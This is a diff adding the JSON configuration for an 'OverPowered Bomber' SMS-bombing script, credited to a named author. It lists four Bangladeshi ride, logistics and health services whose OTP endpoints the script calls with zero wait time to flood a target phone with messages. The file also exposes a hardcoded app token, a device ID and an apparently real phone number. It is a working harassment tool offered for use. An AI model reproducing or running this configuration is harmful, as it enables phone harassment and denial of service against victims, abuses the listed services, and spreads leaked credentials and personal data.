@@ -1,0 +1,61 @@
+{
+    "status":"success",
+    "data":{
+        "lastUpdated":"2021",
+        "version":"1.0",
+        "Script Name":"OverPowered Bomber by IgnoredHaxor",
+        "message":"This is a test message! Never cheat.",
+        "contactLink":"https://facebook.com/ffsowmik",
+        "Author":"Shayer Mahmud Sowmik",
+        "apis":[
+            {
+                "id":1,
+                "name":"Jatri",
+                "url":"https://api.jslglobal.co/user-api/v3/send-otp",
+                "method":"POST",
+                "body":"phone=%2B88*****&jatri_token=J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj",
+                "headers":{
+                    "content-type":"application/x-www-form-urlencoded"
+                },
+                "wait_time":0,
+                "identifier":"OTP sent successfully"
+            },
+            {
+                "id":2,
+                "name":"OBHAI",
+                "url":"https://api.obhai.com/app_start_phone_check",
+                "method":"POST",
+                "body":"phone_no=%2B88*****&count=0",
+                "headers":{
+                    "content-type":"application/x-www-form-urlencoded"
+                },
+                "wait_time":0,
+                "identifier":"Welcome!"
+            },
+            {
+                "id":3,
+                "name":"Truck Lagbe",
+                "url":"https://tethys.trucklagbe.com/authenticate/loginWithPhoneNo",
+                "method":"POST",
+                "body":"{\"userType\":\"shipper\",\"phoneNo\":\"*****\",\"deviceId\":\"40b4b3e9639cdf42\"}",
+                "headers":{
+                    "content-type":"application/json"
+                },
+                "wait_time":0,
+                "identifier":"OTP sent successfully"
+            },
+            {
+                "id":4,
+                "name":"BD HEALTHLINE",
+                "url":"https://bdhealthline.net/health-line-bd-ws/api/user/send-otp",
+                "method":"POST",
+                "body":"{\"mobileNo\":\"01841356024\",\"otpType\":\"R\"}",
+                "headers":{
+                    "content-type":"application/json"
+                },
+                "wait_time":0,
+                "identifier":"OTP sent successfully"
+            }
+        ]
+    }
+}
